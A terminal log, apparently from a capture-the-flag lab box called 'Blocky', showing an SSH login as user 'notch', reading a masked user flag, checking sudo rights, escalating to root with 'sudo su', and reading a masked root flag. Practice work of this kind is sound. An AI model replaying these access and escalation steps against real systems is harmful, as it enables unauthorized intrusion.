allenwest1@debian:~$ ssh notch@10.10.10.37
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Tue Apr 28 12:03:29 2020 from 10.10.14.13
notch@Blocky:~$ ls
minecraft  user.txt
notch@Blocky:~$ cat user.txt 
********************************
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo su
root@Blocky:/home/notch# whoami
root
root@Blocky:/home/notch# cd ../../
root@Blocky:/# cd root/
root@Blocky:~# ls
root.txt
root@Blocky:~# cat root.txt
********************************
